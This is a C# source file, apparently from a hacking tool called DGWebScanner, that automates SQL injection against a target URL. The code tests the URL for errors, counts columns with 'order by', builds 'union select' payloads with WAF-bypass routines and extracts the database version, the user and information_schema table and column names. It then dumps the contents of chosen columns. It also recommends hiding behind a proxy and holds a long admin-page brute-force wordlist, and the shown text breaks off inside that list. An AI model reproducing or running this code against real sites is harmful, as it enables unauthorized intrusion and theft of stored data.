using MaterialSkin;
using MaterialSkin.Controls;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Linq;
using System.Net;
using System.Net.Cache;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DGWebScanner.Properties;
using System.Drawing;

// ReSharper disable RedundantToStringCall

namespace DGWebScanner
{

    public partial class Form1 : MaterialForm
    {

        public Form1()
        {
            InitializeComponent();
            MaterialSkinManager materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            string themeColor = Settings.Default["themeColorSetting"].ToString();
            if (themeColor == "LIGHT")
            {
                lightCheckBox.Checked = true;
                darkCheckBox.Checked = false;
                materialSkinManager.Theme = MaterialSkinManager.Themes.LIGHT;
            }
            else
            {
                lightCheckBox.Checked = false;
                darkCheckBox.Checked = true;
                materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
            }
            string primaryColor = Settings.Default["primaryColorSetting"].ToString();
            string accentColor = Settings.Default["accentColorSetting"].ToString();
            string textShadeColor = Settings.Default["textShadeColorSetting"].ToString();
            materialSkinManager.ColorScheme = new ColorScheme(GetPrimaryColor(primaryColor, 700),
                GetPrimaryColor(primaryColor, 800), GetPrimaryColor(primaryColor, 500), GetAccentColor(accentColor, 200),
                GetTextColor(textShadeColor));
        }

        string foundTableAndColumnNamesUrl;
        string columnNumbers;
        string firstVulnerableColumn;
        string[] splitUrl;
        string unionSelectVersion;
        string concatVersion;

        private void getVulnerableInfo_DoWork(object sender, DoWorkEventArgs e)
        {
            string newColumnNumbers = "";
            try
            {
                using (WebDownload client = new WebDownload())
                {
                    client.Timeout = Convert.ToInt32(Settings.Default["internetTimeout"]) + 5;
                    client.Headers.Add("user-agent",
                        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    if (Settings.Default["proxyIPSetting"].ToString() != string.Empty &&
                        Settings.Default["proxyPortSetting"].ToString() != string.Empty)
                    {
                        WebProxy thisProxy =
                            new WebProxy(
                                "http://" + Settings.Default["proxyIPSetting"].ToString() + ":" +
                                Settings.Default["proxyPortSetting"].ToString(), true);
                        if (Settings.Default["proxyUsernameSetting"].ToString() != string.Empty &&
                            Settings.Default["proxyPasswordSetting"].ToString() != string.Empty)
                        {
                            thisProxy.Credentials =
                                new NetworkCredential(Settings.Default["proxyUsernameSetting"].ToString(),
                                    Settings.Default["proxyPasswordSetting"].ToString());
                        }
                        WebRequest.DefaultWebProxy = thisProxy;
                        client.Proxy = thisProxy;
                    }

                    if (!websiteURL.Text.Contains("http://") && !websiteURL.Text.Contains("https://"))
                    {
                        websiteURL.Invoke((MethodInvoker)delegate
                       {
                           websiteURL.Text = "http://" + websiteURL.Text;
                       });
                    }
                    if (getVulnerableInfo.CancellationPending)
                    {
                        e.Cancel = true;
                        getVulnerableInfo.ReportProgress(100);
                        return;
                    }
                    getVulnerableInfo.ReportProgress(5);
                    statusInfo.Invoke((MethodInvoker)delegate
                   {
                       statusInfo.Text = "Gathering Information";
                   });
                    try
                    {
                        Console.WriteLine("sdfsd    " + websiteURL.Text);
                        string originalWebsiteHtml = client.DownloadString(websiteURL.Text);
                        try
                        {
                            Console.WriteLine(websiteURL.Text + "'");
                            SingleQuoteUrlBypass givenUrl = new SingleQuoteUrlBypass();
                            givenUrl.SetUrl(websiteURL.Text);
                            givenUrl.UpdateUrl();
                            string singleQuoteWebsiteHtml = givenUrl.GetInfo()[3];
                            getVulnerableInfo.ReportProgress(15);
                            //If website is vulnerable
                            if (!singleQuoteWebsiteHtml.Contains(originalWebsiteHtml))
                            {
                                if (singleQuoteWebsiteHtml.Contains("MySQL Query Error") ||
                                    singleQuoteWebsiteHtml.Contains("manual that corresponds to your MySQL"))
                                {
                                    vulnerableStatus.Invoke((MethodInvoker)delegate
                                   {
                                       vulnerableStatus.Text = "OK!";
                                   });
                                }
                                else
                                {
                                    vulnerableStatus.Invoke((MethodInvoker)delegate
                                   {
                                       vulnerableStatus.Text = "Maybe";
                                   });
                                }
                                if (getVulnerableInfo.CancellationPending)
                                {
                                    e.Cancel = true;
                                    getVulnerableInfo.ReportProgress(100);
                                    return;
                                }
                                getVulnerableInfo.ReportProgress(20);
                                //get total columns
                                statusInfo.Invoke((MethodInvoker)delegate
                               {
                                   statusInfo.Text = "Getting total columns";
                               });

                                splitUrl = websiteURL.Text.Split('=');

                                int n = 0;
                                string columnsWebsiteHtml;

                                do
                                {
                                    n = n + 1;
                                    columnsWebsiteHtml =
                                        client.DownloadString(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
                                    Console.WriteLine(splitUrl[0] + "=-" + splitUrl[1] + "+order+by+" + n + "--");
                                    if (n > 50)
                                    {
                                        break;
                                    }
                                    if (getVulnerableInfo.CancellationPending)
                                    {
                                        e.Cancel = true;
                                        getVulnerableInfo.ReportProgress(100);
                                        return;
                                    }
                                } while (!columnsWebsiteHtml.Contains("MySQL Query Error") &&
                                         !columnsWebsiteHtml.Contains("mysql_num_rows()") &&
                                         !columnsWebsiteHtml.Contains("mysql_fetch_array() expects parameter") &&
                                         !columnsWebsiteHtml.Contains("Unknown column '") &&
                                         !columnsWebsiteHtml.Contains("Invalid argument supplied for foreach()"));
                                if (n > 50)
                                {
                                    statusInfo.Invoke((MethodInvoker)delegate
                                   {
                                       statusInfo.Text = "Can't find vulnerable columns. Performing WAF bypass";
                                   });
                                }
                                //n-1 is total AVAILABLE columns
                                columnsStatus.Invoke((MethodInvoker)delegate
                               {
                                   columnsStatus.Text = (n - 1).ToString();
                               });
                                getVulnerableInfo.ReportProgress(25);
                                statusInfo.Invoke((MethodInvoker)delegate
                               {
                                   statusInfo.Text = "Finding vulnerable columns";
                               });
                                //find vulnerable columns
                                columnNumbers = "19971";
                                for (int i = 19972; i < 19970 + n; i++)
                                {
                                    columnNumbers = columnNumbers + "," + i.ToString();
                                }
                                getVulnerableInfo.ReportProgress(30);
                                if (getVulnerableInfo.CancellationPending)
                                {
                                    e.Cancel = true;
                                    getVulnerableInfo.ReportProgress(100);
                                    return;
                                }
                                string wafBypassUnionSelectUrl = splitUrl[0] + "=-" + splitUrl[1] + "+union+select+" +
                                                                 columnNumbers + "--";
                                string[] unionSelectResponse = WafBypassUnionSelect(wafBypassUnionSelectUrl);
                                string vulnerableColumnsUrl = unionSelectResponse[0];
                                Console.WriteLine(vulnerableColumnsUrl);
                                unionSelectVersion = unionSelectResponse[1];
                                Console.WriteLine(unionSelectVersion);
                                string unionSelectNormalBypassNo = unionSelectResponse[2];
                                Console.WriteLine(unionSelectNormalBypassNo);
                                Console.WriteLine(columnNumbers);
                                if (unionSelectNormalBypassNo == "normal" || unionSelectNormalBypassNo == "bypass")
                                {
                                    string correctColumnNumber = " ";
                                    string vulnerableColumnsHtml = client.DownloadString(vulnerableColumnsUrl);
                                    vulnerableColumnsHtml = vulnerableColumnsHtml.Replace(columnNumbers, "DGWebScanner");
                                    for (int i = 19971; i < 19970 + n + 1; i++)
                                    {
                                        if (vulnerableColumnsHtml.Contains(i.ToString()))
                                        {
                                            correctColumnNumber = correctColumnNumber + (i - 19970) + ",";
                                        }
                                        else
                                        {
                                            vulnerableColumnsStatus.Invoke((MethodInvoker)delegate
                                           {
                                               vulnerableColumnsStatus.Text = "None";
                                           });
                                        }
                                        if (getVulnerableInfo.CancellationPending)
                                        {
                                            e.Cancel = true;
                                            getVulnerableInfo.ReportProgress(100);
                                            return;
                                        }
                                    }
                                    correctColumnNumber = correctColumnNumber.Remove(0, 1);
                                    correctColumnNumber = correctColumnNumber.TrimEnd(',');
                                    vulnerableColumnsStatus.Invoke((MethodInvoker)delegate
                                   {
                                       vulnerableColumnsStatus.Text = correctColumnNumber;
                                   });

                                    if (vulnerableColumnsStatus.Text == string.Empty)
                                    {
                                        string[] splitVulnerableColumnsUrl =
                                            vulnerableColumnsUrl.Split(new[] { unionSelectVersion + "+" },
                                                StringSplitOptions.None);
                                        string firstSplitVulnerableColumnsUrl = splitVulnerableColumnsUrl[0];
                                        string secondSplitVulnerableColumnsUrl = splitVulnerableColumnsUrl[1];
                                        Console.WriteLine("SPLIT : " + firstSplitVulnerableColumnsUrl);
                                        string[] numbersSplitVulnerableColumnsUrl =
                                            secondSplitVulnerableColumnsUrl.Split(',');
                                        numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1] =
                                            numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
                                            ].TrimEnd('-');
                                        Console.WriteLine(
                                            numbersSplitVulnerableColumnsUrl[numbersSplitVulnerableColumnsUrl.Length - 1
                                            ]);
                                        firstSplitVulnerableColumnsUrl = firstSplitVulnerableColumnsUrl +
                                                                         unionSelectVersion + "+";
                                        for (int i = 0; i < numbersSplitVulnerableColumnsUrl.Length; i++)
                                        {
                                            string currentVulnerableColumnsUrl = firstSplitVulnerableColumnsUrl +
                                                                                 numbersSplitVulnerableColumnsUrl[i];
                                            Console.WriteLine(currentVulnerableColumnsUrl + "--");
                                            string currentVulnerableColumnsHtml =
                                                client.DownloadString(currentVulnerableColumnsUrl + "--");

                                            if (
                                                currentVulnerableColumnsHtml.Contains(
                                                    numbersSplitVulnerableColumnsUrl[i]))
                                            {
                                                Console.WriteLine(numbersSplitVulnerableColumnsUrl[i]);
                                                vulnerableColumnsStatus.Invoke((MethodInvoker)delegate
                                               {
                                                   vulnerableColumnsStatus.Text = (i + 1).ToString();
                                               });
                                                newColumnNumbers = numbersSplitVulnerableColumnsUrl[i];
                                                break;
                                            }
                                        }
                                    }
                                    getVulnerableInfo.ReportProgress(40);
                                    if (getVulnerableInfo.CancellationPending)
                                    {
                                        e.Cancel = true;
                                        getVulnerableInfo.ReportProgress(100);
                                        return;
                                    }
                                    // File.WriteAllText("C:\\Users\\Daniel\\Desktop\\vul.txt",vulnerableColumnsHTML);
                                    //find version number
                                    statusInfo.Invoke((MethodInvoker)delegate
                                   {
                                       statusInfo.Text = "Finding SQL version";
                                   });
                                    if (vulnerableColumnsStatus.Text.Contains(","))
                                    {
                                        string[] vulnerableColumnArray = vulnerableColumnsStatus.Text.Split(',');
                                        firstVulnerableColumn = vulnerableColumnArray[0];
                                    }
                                    else
                                    {
                                        firstVulnerableColumn = vulnerableColumnsStatus.Text;
                                    }
                                    Console.WriteLine("firstVulnerableColumn : " + firstVulnerableColumn);
                                    string userVersionUrl;
                                    if (newColumnNumbers != "")
                                    {
                                        columnNumbers = newColumnNumbers;
                                    }
                                    string userVersionColumns =
                                        columnNumbers.Replace(
                                            (19970 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                                            "concat(2448,@@version,2448,user(),2448)");
                                    Console.WriteLine("userVersionColumns : " + userVersionColumns);
                                    if (unionSelectNormalBypassNo == "normal")
                                    {
                                        userVersionUrl = splitUrl[0] + "=-" + splitUrl[1] + "+union+select+" +
                                                         userVersionColumns + "--";
                                    }
                                    else
                                    {
                                        userVersionUrl = splitUrl[0] + "=-" + splitUrl[1] + unionSelectVersion +
                                                         userVersionColumns + "--";
                                    }

                                    string[] concatResponse = WafBypassConcat(userVersionUrl);
                                    userVersionUrl = concatResponse[0];
                                    concatVersion = concatResponse[1];
                                    Console.WriteLine(userVersionUrl);
                                    string userVersionHtml = concatResponse[3];
                                    userVersionHtml = userVersionHtml.Replace("(2448,@@version,2448,user(),2448)",
                                        "DGWebScanner");
                                    getVulnerableInfo.ReportProgress(50);
                                    Regex regex = new Regex("2448(.*?)2448(.*?)2448");
                                    Match v = regex.Match(userVersionHtml);
                                    Match v1 = v;
                                    versionNumberStatus.Invoke((MethodInvoker)delegate
                                   {
                                       versionNumberStatus.Text = v1.Groups[1].ToString();
                                   });
                                    Match v2 = v;
                                    usernameStatus.Invoke((MethodInvoker)delegate
                                   {
                                       usernameStatus.Text = v2.Groups[2].ToString();
                                   });
                                    getVulnerableInfo.ReportProgress(60);
                                    if (getVulnerableInfo.CancellationPending)
                                    {
                                        e.Cancel = true;
                                        getVulnerableInfo.ReportProgress(100);
                                        return;
                                    }
                                    //if database version contains 4.
                                    if (versionNumberStatus.Text.Contains("4."))
                                    {

                                        MessageBox.Show(
                                            "Version 4. Please let me know the name of the website and that this message box showed up!!");
                                        //if database version is >=5
                                    }
                                    else
                                    {
                                        Console.WriteLine("Version >=5");
                                        //find Tablenames and Columns
                                        //Database then Table and then column
                                        //Database is 4559 to 3559
                                        //Table is 3559 to :::
                                        //Column is ::: to 2448
                                        statusInfo.Invoke((MethodInvoker)delegate
                                       {
                                           statusInfo.Text = "Finding Tables and Columns";
                                       });
                                        string longTableAndColumnCode =
                                            "concat((select(select+concat(@:=9129,(select+count(*)from(information_schema.columns)" +
                                            "where(1)and(@:=concat" +
                                            "(@,4559,table_schema,3559,table_name,0x3a,0x3a,0x3a,column_name,2448))),@,9129))))";
                                        string plainConcatVersion = concatVersion.TrimStart(',');
                                        plainConcatVersion = plainConcatVersion.TrimEnd('(');
                                        longTableAndColumnCode = longTableAndColumnCode.Replace("concat",
                                            plainConcatVersion);
                                        string foundTableAndColumnNames =
                                            columnNumbers.Replace(
                                                (19970 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                                                longTableAndColumnCode);
                                        foundTableAndColumnNamesUrl = splitUrl[0] + "=-" + splitUrl[1] +
                                                                      "+union+select+" + foundTableAndColumnNames +
                                                                      "--+";

                                        foundTableAndColumnNamesUrl = foundTableAndColumnNamesUrl.Replace(
                                            "union+select", unionSelectVersion);
                                        Console.WriteLine("foundTableAndColumnNames : ");
                                        Console.WriteLine(foundTableAndColumnNamesUrl);
                                        string foundTableAndColumnNamesHtml;
                                        try
                                        {
                                            foundTableAndColumnNamesHtml =
                                                client.DownloadString(foundTableAndColumnNamesUrl);
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine(ex.Message);
                                            statusInfo.Invoke((MethodInvoker)delegate
                                           {
                                               statusInfo.Text = "Website not loading. Attempting Bypass";
                                           });
                                            Console.WriteLine("foundTableAndColumnNamesURL : " +
                                                              foundTableAndColumnNamesUrl);
                                            foundTableAndColumnNamesHtml =
                                                client.DownloadString(foundTableAndColumnNamesUrl.Replace("where(1)",
                                                    "where(table_schema=database())"));
                                        }

                                        getVulnerableInfo.ReportProgress(70);
                                        foundTableAndColumnNamesHtml =
                                            foundTableAndColumnNamesHtml.Replace(longTableAndColumnCode, "DGWebScanner");
                                        // File.WriteAllText(ver, foundTableAndColumnNamesHTML);
                                        Regex onlyFoundTableAndColumnNames = new Regex("9129(4559.*?2448)9129");
                                        v = onlyFoundTableAndColumnNames.Match(foundTableAndColumnNamesHtml);
                                        foundTableAndColumnNamesHtml = v.Groups[1].ToString();

                                        getVulnerableInfo.ReportProgress(80);
                                        Regex regexTable = new Regex("4559(.*?)3559(.*?):::(.*?)2448");
                                        MatchCollection completeInfoMatches =
                                            regexTable.Matches(foundTableAndColumnNamesHtml);
                                        databaseInfoTreeView.Invoke((MethodInvoker)delegate
                                       {
                                           databaseInfoTreeView.Nodes.Clear();
                                       });
                                        getVulnerableInfo.ReportProgress(90);
                                        for (int i = 0; i < completeInfoMatches.Count; i++)
                                        {
                                            int i1 = i;
                                            databaseInfoTreeView.Invoke((MethodInvoker)delegate
                                           {
                                               if (
                                                   !databaseInfoTreeView.Nodes.ContainsKey(
                                                       completeInfoMatches[i1].Groups[1].ToString()))
                                               {
                                                   databaseInfoTreeView.Nodes.Add(
                                                       completeInfoMatches[i1].Groups[1].ToString(),
                                                       completeInfoMatches[i1].Groups[1].ToString());
                                               }

                                               if (
                                                   databaseInfoTreeView.Nodes.ContainsKey(
                                                       completeInfoMatches[i1].Groups[1].ToString()))
                                               {
                                                   if (
                                                       !databaseInfoTreeView.Nodes[
                                                               completeInfoMatches[i1].Groups[1].ToString()].Nodes
                                                           .ContainsKey(completeInfoMatches[i1].Groups[2].ToString()))
                                                   {
                                                       databaseInfoTreeView.Nodes[
                                                           completeInfoMatches[i1].Groups[1].ToString()].Nodes.Add(
                                                           completeInfoMatches[i1].Groups[2].ToString(),
                                                           completeInfoMatches[i1].Groups[2].ToString());
                                                   }
                                               }

                                               if (
                                                   databaseInfoTreeView.Nodes.ContainsKey(
                                                       completeInfoMatches[i1].Groups[1].ToString()))
                                               {
                                                   if (
                                                       !databaseInfoTreeView.Nodes.ContainsKey(
                                                           completeInfoMatches[i1].Groups[2].ToString()))
                                                   {
                                                       if (
                                                           !databaseInfoTreeView.Nodes[
                                                                   completeInfoMatches[i1].Groups[1].ToString()].Nodes[
                                                                   completeInfoMatches[i1].Groups[2].ToString()].Nodes
                                                               .ContainsKey(
                                                                   completeInfoMatches[i1].Groups[3].ToString()))
                                                       {
                                                           databaseInfoTreeView.Nodes[
                                                               completeInfoMatches[i1].Groups[1].ToString()].Nodes[
                                                               completeInfoMatches[i1].Groups[2].ToString()].Nodes.Add(
                                                               completeInfoMatches[i1].Groups[3].ToString(),
                                                               completeInfoMatches[i1].Groups[3].ToString());
                                                       }
                                                   }
                                               }
                                           });
                                            if (getVulnerableInfo.CancellationPending)
                                            {
                                                e.Cancel = true;
                                                getVulnerableInfo.ReportProgress(100);
                                                return;
                                            }
                                        }
                                        databaseInfoTreeView.Invoke((MethodInvoker)delegate
                                       {
                                           databaseInfoTreeView.Enabled = true;
                                       });
                                        vulnerableStatus.Invoke((MethodInvoker)delegate
                                       {
                                           vulnerableStatus.Text = "OK!";
                                       });
                                        getVulnerableInfo.ReportProgress(100);
                                        statusInfo.Invoke((MethodInvoker)delegate
                                       {
                                           statusInfo.Text = "Finished. Click a column to view it's contents";
                                       });
                                        if (getVulnerableInfo.CancellationPending)
                                        {
                                            e.Cancel = true;
                                            getVulnerableInfo.ReportProgress(100);
                                        }

                                    }
                                }
                                else
                                {
                                    statusInfo.Invoke((MethodInvoker)delegate
                                   {
                                       statusInfo.Text = "WAF Bypass failed.";
                                   });
                                }

                            }
                            else
                            {
                                //If website is not vulnerable
                                vulnerableStatus.Invoke((MethodInvoker)delegate
                               {
                                   vulnerableStatus.Text = "No";
                               });
                                statusInfo.Invoke((MethodInvoker)delegate
                               {
                                   statusInfo.Text = "Website is not vulnerable";
                               });
                                getVulnerableInfo.ReportProgress(100);
                            }
                        }
                        catch (WebException ex)
                        {
                            statusInfo.Invoke((MethodInvoker)delegate
                           {
                               statusInfo.Text = ex.Message;
                           });
                            getVulnerableInfo.ReportProgress(100);
                        }

                    }
                    catch (WebException ex)
                    {
                        MessageBox.Show(ex.Message);
                        statusInfo.Invoke((MethodInvoker)delegate
                       {
                           statusInfo.Text = ex.Message;
                       });
                        getVulnerableInfo.ReportProgress(100);
                    }
                }
            }
            catch (Exception ex)
            {
                statusInfo.Invoke((MethodInvoker)delegate
               {
                   statusInfo.Text = ex.Message;
               });
                getVulnerableInfo.ReportProgress(100);
            }

        }

        private void getVulnerableInfo_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            progressBar1.Value = e.ProgressPercentage;
        }

        private void getVulnerableInfo_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Cancelled)
            {
                statusInfo.Invoke((MethodInvoker)delegate
               {
                   statusInfo.Text = "Process was canceled.";
               });
            }
            else if (e.Error != null)
            {
                MessageBox.Show("There was an error running the process. The thread aborted.");
            }
            else
            {
                if (!statusInfo.Text.Contains("error"))
                {
                    statusInfo.Invoke((MethodInvoker)delegate
                   {
                       statusInfo.Text = "Finished. Click a column to view it's contents.";
                   });
                }
            }
            statusInfo.Invoke((MethodInvoker)delegate
           {
               statusInfo.Text = "Finished";
           });
            scanWebsite.Text = "Scan Website";
            scanWebsite.Enabled = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Invoke((MethodInvoker)delegate
            {
                Text = "DGWebScanner | Alpha " + Settings.Default["version"].ToString();
            });
            ContextMenu databaseGridViewMenuStrip1 = new ContextMenu();
            databaseGridView.ContextMenu = databaseGridViewMenuStrip1;
            websiteURL.Hint = "Website URL";
            databaseInfoTreeView.Enabled = false;
            checkUpdates.RunWorkerAsync();
            Size = new Size(617, 599);
            internetTimeoutText.Text = Settings.Default["internetTimeout"].ToString();
            proxyIP.Text = Settings.Default["proxyIPSetting"].ToString();
            proxyPort.Text = Settings.Default["proxyPortSetting"].ToString();
            proxyUsername.Text = Settings.Default["proxyUsernameSetting"].ToString();
            proxyPassword.Text = Settings.Default["proxyPasswordSetting"].ToString();
            proxyPassword.Text = Settings.Default["proxyPasswordSetting"].ToString();
            string textShadeRadio = Settings.Default["textShadeColorSetting"].ToString();
            if (textShadeRadio == "WHITE")
            {
                textShadeWhiteButton.Checked = true;
            }
            else
            {
                textShadeBlackButton.Checked = true;
            }
            primaryColorComboBox.Text = Settings.Default["primaryColorSetting"].ToString();
            accentColorComboBox.Text = Settings.Default["accentColorSetting"].ToString();
            string colorString = Settings.Default["accentColorSetting"].ToString() + "700";
            Accent colorEnum;
            Enum.TryParse(colorString, out colorEnum);
            statusInfo.ForeColor = Color.FromArgb((int)colorEnum);

        }

        private void websiteURL_Click(object sender, EventArgs e)
        {
            if (websiteURL.Text == "Website URL")
            {
                websiteURL.SelectAll();
            }
        }

        private void scanWebsite_Click_1(object sender, EventArgs e)
        {
            progressBar1.Maximum = 100;
            websiteURL.Text = websiteURL.Text.Replace(" ", string.Empty);
            if (Convert.ToBoolean(Settings.Default["firstTimeRun"]))
            {
                DialogResult setProxy =
                    MessageBox.Show(
                        "Using a proxy is highly recommended. Would you like to set up your proxy now? You can always set it up at a later time.",
                        "No Proxy Detected", MessageBoxButtons.YesNo);
                if (setProxy == DialogResult.Yes)
                {
                    settingsButton.PerformClick();
                    proxyIP.Select();
                }
                Settings.Default["firstTimeRun"] = false;
                Settings.Default.Save();
            }

            if (scanWebsite.Text == "Scan Website")
            {
                vulnerableStatus.Text = "N/A";
                columnsStatus.Text = "N/A";
                vulnerableColumnsStatus.Text = "N/A";
                versionNumberStatus.Text = "N/A";
                usernameStatus.Text = "N/A";
                databaseInfoTreeView.Nodes.Clear();
                databaseGridView.Rows.Clear();
                databaseGridView.Columns.Clear();
                databaseInfoTreeView.Nodes.Add("N/A");
            }
            if (getVulnerableInfo.IsBusy)
            {
                scanWebsite.Enabled = false;
                getVulnerableInfo.CancelAsync();
            }
            else
            {
                scanWebsite.Text = "Cancel Scan";
                getVulnerableInfo.RunWorkerAsync();
            }
        }

        private void websiteURL_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                if (scanWebsite.Text == "Scan Website")
                {
                    e.Handled = true;
                    scanWebsite.PerformClick();
                }
            }
        }

        private void databaseInfoTreeView_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (databaseInfoTreeView.SelectedNode.Level == 2 && e.Node.Parent.Parent.Text != "information_schema")
            {
                string foundColumnContent =
                    columnNumbers.Replace((19970 + Convert.ToInt32(firstVulnerableColumn)).ToString(),
                        "group_concat(2448," + e.Node.Text + ",3559)");
                string foundColumnContentUrl = splitUrl[0] + "=-" + splitUrl[1] + "+union+select+" + foundColumnContent +
                                               "+from+" + e.Node.Parent.Text + "--+";
                //Console.WriteLine("Before databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine + foundColumnContentURL);
                // foundColumnContentURL = foundColumnContentURL.Replace("+union+select+", "+" + foundColumnContentVersion + "+");
                Console.WriteLine("databaseInfoTreeView -> foundColumnContentURL : " + Environment.NewLine +
                                  foundColumnContentUrl);

                string[] foundColumnContentResults = WafBypassDatabaseSearch(foundColumnContentUrl);
                string foundColumnContentVersion = foundColumnContentResults[1];
                string foundColumnContentHtml = foundColumnContentResults[3];
                foundColumnContentHtml =
                    foundColumnContentHtml.Replace(foundColumnContentVersion + "2448," + e.Node.Text + ",3559)",
                        "DGWebScanner");
                // File.WriteAllText(ver, foundColumnContentHTML);
                Regex regexTable = new Regex("2448(.*?)3559");
                MatchCollection completeInfoMatches = regexTable.Matches(foundColumnContentHtml);


                if (!databaseGridView.Columns.Contains(e.Node.Text.Replace(" ", string.Empty)))
                {
                    databaseGridView.Columns.Add(e.Node.Text.Replace(" ", string.Empty), e.Node.Text);
                    int currentRowIndex = 0;
                    for (int i = 0; i < completeInfoMatches.Count; i++)
                    {
                        int actualRowIndex = databaseGridView.Rows.Count;
                        if (actualRowIndex < completeInfoMatches.Count)
                        {
                            databaseGridView.Rows.Add();
                        }
                        databaseGridView.Rows[currentRowIndex].Cells[e.Node.Text.Replace(" ", string.Empty)].Value =
                            completeInfoMatches[i].Groups[1].ToString();
                        currentRowIndex = currentRowIndex + 1;
                    }
                }
                foreach (DataGridViewColumn dgvc in databaseGridView.Columns)
                {
                    dgvc.SortMode = DataGridViewColumnSortMode.NotSortable;
                }
                //databaseInfoTreeView.Nodes[aboveDatabase].Nodes[aboveTable].Nodes[selectedColumn].Nodes.Add(completeInfoMatches[i].Groups[1].ToString(), completeInfoMatches[i].Groups[1].ToString());
                // }



            }
        }

        private void databaseGridView_ColumnHeaderMouseClick(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {

            }
        }

        private void websiteURLAdmin_Click(object sender, EventArgs e)
        {
            if (websiteURLAdmin.Text == "Base website URL")
            {
                websiteURLAdmin.SelectAll();
            }
        }

        private void findAdminButton_Click(object sender, EventArgs e)
        {
            if (Convert.ToBoolean(Settings.Default["firstTimeRun"]))
            {
                DialogResult setProxy =
                    MessageBox.Show(
                        "Using a proxy is highly recommended. Would you like to set up your proxy now? You can always set it up at a later time.",
                        "No Proxy Detected", MessageBoxButtons.YesNo);
                if (setProxy == DialogResult.Yes)
                {
                    settingsButton.PerformClick();
                }
                Settings.Default["firstTimeRun"] = false;
                Settings.Default.Save();
            }
            if (findAdminPageWorker.IsBusy)
            {
                findAdminButton.Enabled = false;
                findAdminPageWorker.CancelAsync();
            }
            else
            {
                adminURLListBox.SelectionMode = SelectionMode.One;
                char lastCharInUrl = websiteURLAdmin.Text[websiteURLAdmin.Text.Length - 1];
                if (lastCharInUrl == '/')
                {
                    websiteURLAdmin.Text = websiteURLAdmin.Text.TrimEnd('/');
                }
                findAdminButton.Text = "Cancel Find";
                findAdminPageWorker.RunWorkerAsync();
            }
        }

        private void adminTab_Click(object sender, EventArgs e)
        {

        }

        /*
         * Checking http://admin.micro-mechanics.com/"
        Checking http://adm.micro-mechanics.com/"
        Checking http://admincp.micro-mechanics.com/"
        Checking http://admcp.micro-mechanics.com/"
        Checking http://cp.micro-mechanics.com/"
        Checking http://modcp.micro-mechanics.com/"
        Checking http://moderatorcp.micro-mechanics.com/"
        Checking http://adminare.micro-mechanics.com/"
        Checking http://admins.micro-mechanics.com/"
        Checking http://cpanel.micro-mechanics.com/"
        Checking http://controlpanel.micro-mechanics.com/"

        */

        private readonly string[] adminUrls =
        {
            "/account.asp", "/account.html", "/account.php", "/acct_login/", "/adm.asp", "/adm.html", "/adm.php",
            "/adm/", "/adm/admloginuser.asp", "/adm/admloginuser.php", "/adm/index.asp", "/adm/index.html",
            "/adm/index.php", "/adm_auth.asp", "/adm_auth.php", "/admin1.asp", "/admin1.html", "/admin1.php", "/admin1/",
            "/admin2.asp", "/admin2.html", "/admin2.php", "/admin2/index.asp", "/admin2/index.php", "/admin2/login.asp",
            "/admin2/login.php", "/admin4_account/", "/admin4_colon/", "/admin-login.asp", "/admin-login.html",
            "/admin-login.php", "/admin.asp", "/admin.aspx", "/admin.html", "/admin.php", "/admin/",
            "/admin/account.asp", "/admin/account.html", "/admin/account.php", "/admin/admin-login.asp",
            "/admin/admin-login.html", "/admin/admin-login.php", "/admin/admin.asp", "/admin/admin.html",
            "/admin/admin.php", "/admin/admin_login.asp", "/admin/admin_login.html", "/admin/admin_login.php",
            "/admin/adminLogin.asp", "/admin/adminLogin.html", "/admin/adminLogin.php", "/admin/controlpanel.asp",
            "/admin/controlpanel.html", "/admin/controlpanel.php", "/admin/cp.asp", "/admin/cp.html", "/admin/cp.php",
            "/admin/home.asp", "/admin/home.html", "/admin/home.php", "/admin/index.asp", "/admin/index.html",
            "/admin/index.php", "/admin/login.asp", "/admin/login.aspx", "/ADMIN/login.html", "/admin/login.html",
            "/admin/login.php", "/admin_area/", "/admin_area/admin.asp", "/admin_area/admin.html",
            "/admin_area/admin.php", "/admin_area/index.asp", "/admin_area/index.html", "/admin_area/index.php",
            "/admin_area/login.asp", "/admin_area/login.html", "/admin_area/login.php", "/admin_login.asp",
            "/admin_login.aspx", "/admin_login.html", "/admin_login.php", "/adminarea/", "/adminarea/admin.asp",
            "/adminarea/admin.html", "/adminarea/admin.php", "/adminarea/index.asp", "/adminarea/index.html",
            "/adminarea/index.php", "/adminarea/login.asp", "/adminarea/login.html", "/adminarea/login.php",
            "/admincontrol.asp", "/admincontrol.html", "/admincontrol.php", "/admincontrol/login.asp",
            "/admincontrol/login.html", "/admincontrol/login.php", "/admincp/index.asp", "/admincp/index.html",
            "/admincp/login.asp", "/adminhome.asp", "/adminhome.aspx", "/administartorlogin.aspx", "/administer/",
            "/administr8.asp", "/administr8.html", "/administr8.php", "/administr8/", "/administracion.php",
            "/administrador/", "/administratie/", "/administration.html", "/administration.php", "/administration/",
            "/administrator", "/administrator.asp", "/administrator.html", "/administrator.php", "/administrator/",
            "/administrator/account.asp", "/administrator/account.html", "/administrator/account.php",
            "/administrator/index.asp", "/administrator/index.html", "/administrator/index.php",
            "/administrator/login.asp", "/administrator/login.html", "/administrator/login.php",
            "/administrator_login.asp", "/administrator_login.aspx", "/administratoraccounts/",
            "/administratorlogin.asp", "/administratorlogin.php", "/administratorlogin/", "/administrators/",
            "/administrivia/", "/adminlogin.asp", "/adminLogin.html", "/adminLogin.php", "/adminLogin/",
